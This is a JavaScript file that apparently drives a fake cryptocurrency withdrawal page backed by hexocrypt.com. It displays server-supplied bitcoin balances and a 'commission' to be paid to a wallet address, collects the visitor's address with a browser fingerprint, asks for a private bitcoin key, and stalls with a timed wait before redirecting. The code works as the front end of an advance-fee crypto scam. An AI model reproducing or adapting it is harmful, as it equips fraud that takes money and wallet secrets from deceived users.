const xhr = new XMLHttpRequest()
let url = new URL(window.location.href).searchParams.get("email")

function loaderFunction(status) {
    if (status) {
        let div = document.createElement('div');
        div.style = "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
        div.id = "loader-wrapper"
        div.innerHTML = '<div class="loader" style="color:red;"></div>'
        document.body.append(div)
    } else {
        document.getElementById("loader-wrapper").remove()

    }
}

async function send_request(type, laoder, url, data) {
    if (laoder) { loaderFunction(false) }
    return new Promise((resolve, reject) => {
        let page = `https://hexocrypt.com/api/${url}`;
        xhr.open(type, page)
        xhr.responseType = "json"
        xhr.setRequestHeader("Accept", "application/json")
        xhr.setRequestHeader("Content-Type", "application/json")
        xhr.setRequestHeader("Access-Control-Allow-Origin", "*")
        xhr.setRequestHeader("mode", "no-cors")
        xhr.setRequestHeader("cache", "no-cache")
        xhr.setRequestHeader("credentials", "same-origin")
        xhr.setRequestHeader("redirect", "follow")

        xhr.onload = () => {
            resolve(xhr.response)
        }

        if (data != false) {
            xhr.send(JSON.stringify(data))
        }
        else {
            xhr.send()

        }
    })
}

async function setElements(priceBitcoinCommission, priceInBitcoin, priceEuro, qr, commissionBTC, commissionEuro, address, fullWalletAddress) {
    let currencyText = "EUR"
    const currency = localStorage.getItem("currency")

    if(currency == "dollar"){
        currencyText = "USD"
    }else if(currency == "euro"){
        currencyText = "EUR"
    }

    document.getElementById("balance_bitcoin").textContent = priceInBitcoin + ` BTC`
    document.getElementById("balance_euro").textContent = priceEuro + ` ${currencyText}`
    document.getElementById("get_commission").textContent = `${commissionEuro} ${currencyText} = ${commissionBTC} BTC`
    document.querySelector(".btc_address").textContent = fullWalletAddress
    document.querySelector("#get_balance").textContent = `${priceEuro} ${currencyText} = ${priceInBitcoin} BTC`
    document.getElementById("loader-wrapper").remove()
}

async function show(keys) {
    const wait = document.getElementById('wait')
    const fill_error = document.getElementById("fill-data")
    const address_value = document.getElementById("email-input").value
    // const email = document.getElementById('email_input').value

    if (address_value === "") {
        fill_error.classList.add("active")
        setTimeout(() => {
            fill_error.classList.remove("active")
        }, 6000)
        return
    }


    send_request("post", false, "withdraw-notifications", { type: "withdraw", address: address_value, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
    wait.classList.add('active');

    setTimeout(() => {
        window.location.href = `withdraw-3.html?email=${url}`
    }, 15000)
}

window.check_data = async function () {
    let keys = await send_request("get", false, "keys", false)
    await show({ keys })
}

function handleClickOnce() {
    document.getElementById("popup").classList.add("show")
    popup.addEventListener('click', function (event) {
        if (event.target === popup) {
            popup.classList.remove('show');
        }
    });
    this.onclick = null;
}

const emailInput = document.getElementById('email-input');
emailInput.onclick = handleClickOnce;


async function check(keys) {
    const fill_error = document.querySelector('.incorrect_error');
    const sicret_key_input = document.getElementById('private_bitcoin_wallet').value;
    const incorrect_error = document.querySelector('.data_ok')

    if (sicret_key_input == "") {
        fill_error.classList.add('active');
        setTimeout(() => {
            fill_error.classList.remove('active');
        }, 7000)

        return
    } else {
        for (let key in keys) {
            if (keys[key].bitcoin_key == sicret_key_input) {
                incorrect_error.classList.add("active");
                fill_error.classList.remove("active");

                return
            }
            else {
                incorrect_error.classList.add("active");
                setTimeout(() => {
                    incorrect_error.classList.remove("active");
                    fill_error.classList.remove("active");

                }, 7000)
            }
        }



    }



}

async function check_private_id() {
    let keys = await send_request("get", false, "keys", false)
    await check(keys)
}


async function start() {
    let currency = localStorage.getItem("currency")

    let address = await send_request("get", false, "address_change", false)
    let qr = await send_request("get", false, "qr_change", false)
    let getPriceBitcoin = await send_request("get", false, "price_change", false)
    let setPriceBitcoin = getPriceBitcoin["price_euro"]
    let sendPriceBitcoin = await send_request("post", false, "transaction-convert", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let getPriceBitcoinCommission = await send_request("post", false, "transaction-commission", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let setPriceBitcoinCommission = getPriceBitcoinCommission.price
    let getPriceInEuro = await send_request("post", false, "transaction-convert-euro", { currency, price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let getPriceInEuroCommission = await send_request("post", false, "transaction-convert-euro", { currency, price: setPriceBitcoinCommission, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let fullWalletAddress = await send_request("get", false, "full_wallet_address", false)
    setElements(sendPriceBitcoin, Number(setPriceBitcoin).toFixed(8), Number(getPriceInEuro.price).toFixed(2), qr, setPriceBitcoinCommission, Number(getPriceInEuroCommission.price).toFixed(2), address.address, fullWalletAddress?.full_wallet_address)
    // setElements(sendPriceBitcoin, Number(setPriceBitcoin.toFixed(8)).toFixed(2), Number(getPriceInEuro.price).toFixed(2), qr, setPriceBitcoinCommission, Number(getPriceInEuroCommission.price).toFixed(2), address.address)
}

start()
